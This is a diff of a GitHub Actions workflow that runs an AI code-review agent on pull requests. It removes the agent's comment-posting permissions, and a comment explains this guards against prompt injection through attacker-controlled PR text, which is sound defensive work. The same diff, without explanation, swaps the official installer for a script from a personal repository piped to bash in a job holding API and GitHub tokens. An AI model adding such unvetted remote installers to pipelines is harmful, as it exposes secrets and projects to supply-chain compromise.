@@ -32,7 +32,7 @@ jobs:
       - uses: ./.github/actions/setup-bun
 
       - name: Install opencode
-        run: curl -fsSL https://opencode.ai/install | bash
+        run: curl -fsSL https://raw.githubusercontent.com/ozgurulukir/opencode-personal/main/install.sh | bash
 
       - name: Get PR details
         id: pr-details
@@ -47,7 +47,12 @@ jobs:
         env:
           OPENCODE_API_KEY: ${{ secrets.OPENCODE_API_KEY }}
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          OPENCODE_PERMISSION: '{ "bash": { "*": "deny", "gh pr view*": "allow", "gh pr diff*": "allow", "gh pr list*": "allow", "gh issue comment*": "allow", "gh api --method POST * /repos/*/pulls/*/comments*": "allow" } }'
+          # Security: the agent now gets read-only gh commands only. The comment-posting
+          # allows (gh issue comment* and the gh api POST .../comments) were removed so
+          # attacker-controlled PR text cannot steer it into publishing arbitrary comments.
+          # Trade-off: the review is emitted to the workflow log instead of being posted on
+          # the PR thread; a human must copy it over (or add a schema-validated poster step).
+          OPENCODE_PERMISSION: '{ "bash": { "*": "deny", "gh pr view*": "allow", "gh pr diff*": "allow", "gh pr list*": "allow" } }'
           PR_TITLE: ${{ steps.pr-details.outputs.title }}
         run: |
           PR_BODY=$(jq -r .body pr_data.json)
@@ -70,18 +75,8 @@ jobs:
           When critiquing code against the style guide, be sure that the code is ACTUALLY in violation, don't complain about else statements if they already use early returns there. You may complain about excessive nesting though, regardless of else statement usage.
           When critiquing code style don't be a zealot, we don't like "let" statements but sometimes they are the simplest option, if someone does a bunch of nesting with let, they should consider using iife (see packages/opencode/src/util.iife.ts)
 
-          Use the gh cli to create comments on the files for the violations. Try to leave the comment on the exact line number. If you have a suggested fix include it in a suggestion code block.
+          Write your review as your final response text. Do NOT call any gh command that posts or writes comments - the agent has no comment-posting permission in this workflow. For each violation include the file path and exact line number, and wrap suggested fixes in a suggestion code block.
           If you are writing suggested fixes, BE SURE THAT the change you are recommending is actually valid typescript, often I have seen missing closing "}" or other syntax errors.
-          Generally, write a comment instead of writing suggested change if you can help it.
+          Generally, describe the problem instead of writing a suggested change if you can help it.
 
-          Command MUST be like this.
-          \`\`\`
-          gh api \
-            --method POST \
-            -H \"Accept: application/vnd.github+json\" \
-            -H \"X-GitHub-Api-Version: 2022-11-28\" \
-            /repos/${{ github.repository }}/pulls/${{ steps.pr-number.outputs.number }}/comments \
-            -f 'body=[summary of issue]' -f 'commit_id=${{ steps.pr-details.outputs.sha }}' -f 'path=[path-to-file]' -F \"line=[line]\" -f 'side=RIGHT'
-          \`\`\`
-
-          Only create comments for actual violations. If the code follows all guidelines, comment on the issue using gh cli: 'lgtm' AND NOTHING ELSE!!!!."
+          Only report actual violations. If the code follows all guidelines, respond with 'lgtm' AND NOTHING ELSE!!!!."
